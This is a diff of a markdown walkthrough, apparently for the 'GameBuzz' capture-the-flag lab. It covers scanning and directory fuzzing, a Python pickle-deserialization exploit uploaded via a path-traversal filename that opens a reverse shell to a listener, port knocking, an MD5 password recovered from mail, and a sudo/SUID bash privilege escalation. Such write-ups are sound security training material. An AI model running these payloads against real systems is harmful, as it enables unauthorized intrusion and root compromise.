@@ -1130,19 +1130,14 @@ www-data@incognito:/$ knock incognito 5020:tcp 6120:tcp 7340:tcp incognito
 <h1 align="center">Port Scanning</h1>
 
 ```bash
-:~/GameBuzz# nmap -sC -sV -Pn -n -p- -T4 10.67.143.85
-```
-
-```bash
-:~#  rustscan -a MACHINE_IP --scripts none
-```
-
-<br>
-<br>
-<h1 align="center">Web Vulnerability Scanning</h1>
-
-```bash
-:~/GameBuzz# nikto -h http://incognito.com
+:~/GameBuzz# nmap -sC -sV -Pn -n -p- -T4 MACHINE_IP
+...
+Host is up (0.00012s latency).
+Not shown: 65533 closed ports
+PORT   STATE    SERVICE
+22/tcp filtered ssh
+80/tcp open     http
+|_http-title: Incognito
 ```
 
 <br>
@@ -1169,19 +1164,33 @@ MACHINE_IP incognito.com
 
 <br>
 <br>
-<h1 align="center">Directory and File Enumeration</h1>
-<p>
-
-- Identify <strong>dev.incognito.com/robots.txt</strong> and <strong>dev.incognito.com/secret/uploads/</strong>.</p>
+<h1 align="center">Web Vulnerability Scanning</h1>
 
 ```bash
-
+:~/GameBuzz# nikto -h http://incognito.com
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          MACHINE_IP
++ Target Hostname:    incognito.com
++ Target Port:        80
++ Start Time:         2026-02-05 XX:XX:XX (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /, fields: 0x39 0x5bc657239840a 
++ Allowed HTTP Methods: OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2026-02-05 XX:XX:XX (GMT0) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
 ```
 
 <br>
 <br>
 <h1 align="center">Web Interface Inspection</h1>
-<p align="center">dev.incognito.com</p>
+<p align="center">incognito.com</p>
 <p>
 
 - Navigate to <strong>incognito.com</strong>.<br>
@@ -1211,9 +1220,7 @@ MACHINE_IP incognito.com
 {"Game": "Red Dead Redemption 2", "Rating": 10, "Review": "Too Good"}
 ```
 
-
 <img width="1276" height="463" alt="image" src="https://github.com/user-attachments/assets/26e3bf99-c9ae-403c-98b2-ae63b119a0b2" />
-
 
 <br>
 <br>
@@ -1276,26 +1283,13 @@ MACHINE_IP incognito.com dev.incognito.com
 
 <br>
 <br>
-<h1 align="center">Web Vulnerability Scanning</h1>
-
-```bash
-:~/GameBuzz# nikto -h http://dev.incognito.com
-```
-
-<br>
-<br>
 <h1 align="center">Directory and File Enumeration</h1>
 <p>
 
 - Identify dev.incognito.com/<code>robots.txt</code> and dev.incognito.com/secret<code>/uploads</code>/.</p>
 
 ```bash
-:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -ic -c -recursion -mc 200,301
-...
-```
-
-```bash
-:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -c -recursion
+:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/dirb/wordlists/big.txt -ic -c -recursion -mc 200,301
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1309,35 +1303,29 @@ ________________________________________________
 
  :: Method           : GET
  :: URL              : http://dev.incognito.com/FUZZ
- :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Matcher          : Response status: 200,301
 ________________________________________________
 
-                        [Status: 200, Size: 57, Words: 5, Lines: 2]
+robots.txt              [Status: 200, Size: 32, Words: 3, Lines: 3]
 secret                  [Status: 301, Size: 323, Words: 20, Lines: 10]
 [INFO] Adding a new job to the queue: http://dev.incognito.com/secret/FUZZ
 
-                        [Status: 200, Size: 57, Words: 5, Lines: 2]
-server-status           [Status: 403, Size: 282, Words: 20, Lines: 10]
 [INFO] Starting queued job on target: http://dev.incognito.com/secret/FUZZ
 
-                        [Status: 403, Size: 282, Words: 20, Lines: 10]
 upload                  [Status: 301, Size: 330, Words: 20, Lines: 10]
 [INFO] Adding a new job to the queue: http://dev.incognito.com/secret/upload/FUZZ
 
-                        [Status: 403, Size: 282, Words: 20, Lines: 10]
 [INFO] Starting queued job on target: http://dev.incognito.com/secret/upload/FUZZ
 
-                        [Status: 200, Size: 370, Words: 58, Lines: 15]
-                        [Status: 200, Size: 370, Words: 58, Lines: 15]
-:: Progress: [220547/220547] :: Job [3/3] :: 8873 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+:: Progress: [20469/20469] :: Job [3/3] :: 16519 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
 
-<img width="1260" height="651" alt="image" src="https://github.com/user-attachments/assets/7324d6d3-d4f8-45e5-a880-1bbec5bf3902" />
+<img width="1028" height="530" alt="image" src="https://github.com/user-attachments/assets/65780e6d-878f-44a6-a0d5-6cb82d46f56d" />
 
 <br>
 <br>
@@ -1379,8 +1367,23 @@ Disallow: /secret
 
 <p>
 
-- Note the message <strong>The file test.txt has been uploaded</strong>.<br>
-- Check <strong>Burp Suite</strong>.<br>
+- Note the message <strong>The file test.txt has been uploaded</strong>.</p>
+
+<img width="1015" height="153" alt="image" src="https://github.com/user-attachments/assets/dadad8e9-78c8-4b42-a1a5-6e8a6be5eae2" />
+
+<br>
+<br>
+<p>
+	
+- Check <strong>Burp Suite</strong>.</p>
+
+<img width="1025" height="349" alt="image" src="https://github.com/user-attachments/assets/09c8fa68-8cdc-45cd-b49a-0f6e2f797184" />
+
+
+<br>
+<br>
+<p>
+	
 - Remember the  <strong>.pkl</strong> object fetched in previous <strong>Request</strong><br>
 - Craft a <strong>pickle</strong> exploit to upload a <strong>.pkl</strong> object.<br>
 - Set up a listener.<br><br>
@@ -1435,6 +1438,44 @@ if __name__ == '__main__':
     main()
 ```
 
+
+
+
+
+
+
+#!/usr/bin/env python3
+
+import requests
+import pickle
+import os
+
+class PickleRCE:
+    def __reduce__(self):
+        return (os.system,("bash -c '/bin/bash -i >& /dev/tcp/10.80.69.72/4444 0>&1' ",))
+
+
+def main():
+    uploadURL = 'http://dev.incognito.com/secret/upload/script.php'
+    uploadData = {'submit': 'Start Upload'}
+
+    filename = 'r.pkl'
+    file = {
+        'the_file': (f'../../../../../../../../../var/upload/{filename}', pickle.dumps(PickleRCE()))
+    }
+
+    uploadRequestResult = requests.post(uploadURL, data=uploadData, files=file)
+    print(f'[*] Upload file request:\n{uploadRequestResult.text}')
+
+    pickleURL = 'http://incognito.com/fetch'
+    pickleData = {'object': f'/var/upload/{filename}'}
+
+    pickleRequestResult = requests.post(pickleURL, json=pickleData)
+    print(f'[*] Fetch pickle request:\n{pickleRequestResult.text}')
+
+if __name__ == '__main__':
+    main()
+
 ______________________
 a parte
 ```bash
@@ -1450,6 +1491,30 @@ a parte
 <p>upload  the shell file in http://dev.incognito.com/secret/upload/
 ______________________
 
+<br>
+<br>
+<br>
+
+<img width="1032" height="176" alt="image" src="https://github.com/user-attachments/assets/9a10b674-04c9-4a2f-b3d4-d2268d502389" />
+
+<br>
+<br>
+
+<img width="1033" height="179" alt="image" src="https://github.com/user-attachments/assets/5fef54ad-47c3-4afa-82a3-51e1b1db0079" />
+
+
+<br>
+<br>
+www-data@incognito:/$ which python3
+which python3
+/usr/bin/python3
+www-data@incognito:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@incognito:/$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~/GameBuzz# stty raw -echo; fg
+nc -nlvp 4444
+
 
 
 <p>
@@ -1457,44 +1522,116 @@ ______________________
 - Stabilize the shell.</p>
 
 ```bash
-...
-www-data@incognito:/$ python -c '
-
-Crtl^Z
-stty
-
-www-data@incognito:/$ export TERM-xterm-256color
+:~/GameBuzz# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on MACHINE_IP 56762
+bash: cannot set terminal process group (1300): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@incognito:/$ which python3
+which python3
+/usr/bin/python3
+www-data@incognito:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@incognito:/$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~/GameBuzz# stty raw -echo; fg
+nc -nlvp 4444
+www-data@incognito:/$ export TERM=xterm-256color
 ```
 
 ```bash
-...
 www-data@incognito:/$ whoami;id;hostname;pwd;ip a
-
-
-...
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(nosu)
+incognito
+/
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+    link/ether 0a:fc:fa:c2:35:49 brd ff:ff:ff:ff:ff:ff
+    inet 10.80.187.78/18 brd 10.80.191.255 scope global dynamic ens5
+       valid_lft 2782sec preferred_lft 2782sec
+    inet6 fe80::8fc:faff:fec2:3549/64 scope link 
+       valid_lft forever preferred_lft forever
 ```
+
+<img width="1028" height="593" alt="image" src="https://github.com/user-attachments/assets/5f8e6804-ca6d-4af8-ba92-dc9cca5fd784" />
+
 
 ```bash
-...
-www-data@incognito:/$ cat /etc/passwd | grep 'bin/bash'
-
-
-...
+www-data@incognito:/$ cat /etc/passwd | grep '/bin/bash'
+root:x:0:0:root:/root:/bin/bash
+dev1:x:1001:1001::/home/dev1:/bin/bash
+dev2:x:1000:1000:cirius:/home/dev2:/bin/bash
 ```
+
+
+<p>
+
+- Identify dev1´s hash type using <strong>hash-identifier</strong><br>
+- Crack the hash using <a>https://crackstation.net/CrackStation</a></p>
 
 
 ```bash
 www-data@incognito:/$ cat /home/dev2/user.txt
+d14def35ed0bd914c1c5881fa0fa8090
+```
+
+```bash
+:~/GameBuzz# snap install hash-id
+```
+
+sudo /etc/init.d/knockd stop && /bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' && /tmp/rootbash -p
+
+```bash
+:~/GameBuzz# hash-id -h d14def35ed0bd914c1c5881fa0fa8090
+Hash: d14def35ed0bd914c1c5881fa0fa8090
+  [+] MD5
 ...
 ```
 
+<img width="1033" height="153" alt="image" src="https://github.com/user-attachments/assets/78003d40-dd88-43c7-9178-825c4434741f" />
+
+
+<br>
+<br>
+
+Crackstation
+
+<br>
+<br>
+
 ```bash
-www-data@incognito:/var/www/incognito.com$ ls
-__pycache__  incognito	incognito.wsgi
+www-data@incognito:/var/www$ ls -lah
+total 24K
+drwxr-xr-x  5 www-data root     4.0K Aug 11  2021 .
+drwxr-xr-x 15 root     root     4.0K Mar  6  2021 ..
+-rw-------  1 www-data www-data   37 Aug 11  2021 .bash_history
+drwxr-xr-x  3 www-data root     4.0K Feb 28  2021 dev.incognito.com
+drwxr-xr-x  2 root     root     4.0K Jun 18  2021 html
+drwxr-xr-x  4 www-data root     4.0K Feb 28  2021 incognito.com
 ```
 
 ```bash
-ww-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
+www-data@incognito:/var/www$ cd incognito.com
+```
+
+```bash
+www-data@incognito:/var/www/incognito.com$ ls -lah
+total 20K
+drwxr-xr-x 4 www-data root 4.0K Feb 28  2021 .
+drwxr-xr-x 5 www-data root 4.0K Aug 11  2021 ..
+drwxr-xr-x 2 www-data root 4.0K Feb 28  2021 __pycache__
+drwxr-xr-x 5 www-data root 4.0K Feb 28  2021 incognito
+-rw-r--r-- 1 www-data root  221 Feb 28  2021 incognito.wsgi
+```
+
+```bash
+www-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
 #!/usr/bin/python3
 import sys
 import logging
@@ -1505,76 +1642,208 @@ from incognito import app as application
 application.secret_key = 'KeepITSecret'
 ```
 
+
+
 ```bash
-www-data@incognito:/$ cat /var/www/incognito.com/incognito.wsgi
+www-data@incognito:/var/www/incognito.com$ su dev2
+dev2@incognito:/var/www/incognito.com$ 
 ```
 
 ```bash
-www-data@incognito:/home/dev2$ cd /var/mail/
+dev2@incognito:/var/www/incognito.com$ whoami;id;hostname;ip a
+dev2
+uid=1000(dev2) gid=1000(dev2) groups=1000(dev2),24(cdrom),30(dip),46(plugdev),1002(nosu)
+incognito
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+    link/ether 0a:fc:fa:c2:35:49 brd ff:ff:ff:ff:ff:ff
+    inet 10.80.187.78/18 brd 10.80.191.255 scope global dynamic ens5
+       valid_lft 1954sec preferred_lft 1954sec
+    inet6 fe80::8fc:faff:fec2:3549/64 scope link 
+       valid_lft forever preferred_lft forever
 ```
 
 ```bash
-www-data@incognito:/var/mail$ ls -la
-```
-
-```bash
-www-data@incognito:/var/mail$ cat dev1
+dev2@incognito:/var/www/incognito.com$ cat /var/mail/dev1
 Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
 Knock yourself in!
 ```
 
-<p>
-
-- Identify dev1´s hash type using <strong>hash-identifier</strong><br>
-- Crack the hash using <a>https://crackstation.net/CrackStation</a></p>
-
 ```bash
-:~# sudo apt install hash-identifier
+dev2@incognito:/$ cat /etc/knockd.conf
+[options]
+	logfile = /var/log/knockd.log
+
+[openSSH]
+	sequence    = 5020,6120,7340
+	seq_timeout = 15
+	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    = syn
+
+[closeSSH]
+	sequence    = 9000,8000,7000
+	seq_timeout = 15
+	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
+	tcpflags    = syn
 ```
 
-```bash
-:~# sudo snap install hash-id
-```
-
-```bash
-:~# pip install hashid
-```
-
-```bash
-:~# hash-id dc647eb65e6711e155375218212b3964
-```
-
-```bash
-:~# echo -n "Your-String-Here" | md5sum
-```
-
-```bash
-www-data@incognito:/tmp$ knockd -v 5020 6120 7340
-hitting tcp .....:6120
-hitting tcp .....:7340
-```
+www-data@incognito:/var/www/incognito.com$ getent hosts
+127.0.0.1       localhost
+127.0.1.1       incognito
+127.0.0.1       ip6-localhost ip6-loopback
 
 
 ```bash
-:~# knock -v 10.10.162.158 5020 6120 7340
-hitting tcp 10.10.162.158:5020
-hitting tcp 10.10.162.158:6120
-hitting tcp 10.10.162.158:7340
+www-data@incognito:/var/www/incognito.com$ knock -v 10.80.187.78 5020 6120 7340
+hitting tcp 10.80.187.78:5020
+hitting tcp 10.80.187.78:6120
+hitting tcp 10.80.187.78:7340
 ```
 
-```bash
-:~# ssh dev1@incognito.com
-```
+
+
+www-data@incognito:/$ ssh dev1@::1  
+dev1@::1's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-153-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Feb  5 17:36:58 UTC 2026
+
+  System load:  0.0                Processes:           114
+  Usage of /:   45.0% of 10.76GB   Users logged in:     0
+  Memory usage: 33%                IP address for ens5: 10.80.187.78
+  Swap usage:   0%
+
+
+66 packages can be updated.
+1 update is a security update.
+
+
+You have mail.
+Last login: Fri Jun 11 09:03:25 2021 from 192.168.29.217
+dev1@incognito:~$ 
+
+
+<img width="884" height="399" alt="image" src="https://github.com/user-attachments/assets/71b408e1-f56d-4b27-8bc9-ac8f4474d2c2" />
+
+
+
 
 Password
 
 ```bash
-dev1@incognito:~$ sudo -l
+dev1@incognito:/$ sudo -l
+Matching Defaults entries for dev1 on incognito:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dev1 may run the following commands on incognito:
+    (root) /etc/init.d/knockd
 ```
 
 ```bash
 dev1@incognito:~$ ls -lah /etc/init.d/knockd
+-rwxr-xr-x 1 root root 1.8K Oct  8  2016 /etc/init.d/knockd
 ```
+
+```bash
+dev1@incognito:/etc/default$ cat knockd
+# control if we start knockd at init or not
+# 1 = start
+# anything else = don't start
+# PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
+START_KNOCKD=1
+
+# command line options
+KNOCKD_OPTS="-i eth0"
+```
+
+
+```bash
+dev1@incognito:~$ cat /etc/init.d/knockd
+#! /bin/sh
+
+### BEGIN INIT INFO
+# Provides:          knockd
+# Required-Start:    $network $syslog $remote_fs
+# Required-Stop:     $network $syslog $remote_fs
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: port-knock daemon
+### END INIT INFO
+
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+DAEMON=/usr/sbin/knockd
+NAME=knockd
+PIDFILE=/var/run/$NAME.pid
+DEFAULTS_FILE=/etc/default/knockd
+DESC="Port-knock daemon"
+OPTIONS=" -d"
+
+umask 0037
+
+test -f $DAEMON || exit 0
+
+set -e
+
+[ -f $DEFAULTS_FILE ] && . $DEFAULTS_FILE
+
+. /lib/lsb/init-functions
+
+[ "$KNOCKD_OPTS" ] && OPTIONS="$OPTIONS $KNOCKD_OPTS"
+
+start_if_configured() {
+    if [ $START_KNOCKD -ne 1 ]; then
+        log_warning_msg "$NAME disabled: not starting. To enable it edit $DEFAULTS_FILE"
+        exit 0
+    else
+        log_daemon_msg "Starting $DESC" "$NAME"
+        if ! START_ERROR=`start-stop-daemon --start --oknodo --quiet --exec $DAEMON -- $OPTIONS 2>&1`; then
+            # don't fail the upgrade if it fails to start
+            echo -n " "
+            log_action_end_msg 1 "$START_ERROR"
+            exit 0
+        else
+            log_end_msg 0
+        fi
+    fi
+}
+
+case "$1" in
+    start)
+        start_if_configured
+        ;;
+    stop)
+        log_daemon_msg "Stopping $DESC" "$NAME"
+        start-stop-daemon --stop --oknodo --quiet --exec $DAEMON
+        log_end_msg 0
+        ;;
+    restart|reload|force-reload)
+        log_daemon_msg "Stopping $DESC" "$NAME"
+        start-stop-daemon --stop --oknodo --quiet --exec $DAEMON
+        log_end_msg 0
+        sleep 1
+        start_if_configured
+        ;;
+    *)
+        log_warning_msg "Usage: $0 {start|stop|restart|reload|force-reload}" >&2
+        exit 1
+        ;;
+esac
+
+exit 0
+dev1@incognito:~$ 
+```
+
+
 
 ```bash
 dev1@incognito:~$ cat /etc/knock.conf
@@ -1600,17 +1869,43 @@ dev1@incognito:~$ cat /etc/knock.conf
         tcpflags    = syn
 ```
 
+<img width="1211" height="309" alt="image" src="https://github.com/user-attachments/assets/7806b4f8-7e3e-4733-9b35-f31f9173dd2c" />
+
+<br>
+<br>
 
 ```bash
-dev1@incognito:~$ sudo /etc/init.d/knockd restart
-...
+dev1@incognito:/$ sudo /etc/init.d/knockd restart
+[sudo] password for dev1: 
+[ ok ] Restarting knockd (via systemctl): knockd.service.
 ```
 
 ```bash
-dev1@incognito:~$ knock -v 10.10.162.158 5020 6120 7340
-hitting tcp 10.10.162.158:5020
-hitting tcp 10.10.162.158:6120
-hitting tcp 10.10.162.158:7340
+dev1@incognito:/$ getent hosts
+127.0.0.1       localhost
+127.0.1.1       incognito
+127.0.0.1       ip6-localhost ip6-loopback
+```
+
+```bash
+dev1@incognito:/$ netstat -tunlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 10.80.187.78:68         0.0.0.0:*                           -
+```
+
+```bash
+dev1@incognito:/$ knock -v 10.80.187.78 5020 6120 7340
+hitting tcp 10.80.187.78:5020
+hitting tcp 10.80.187.78:6120
+hitting tcp 10.80.187.78:7340
 ```
 
 ```bash
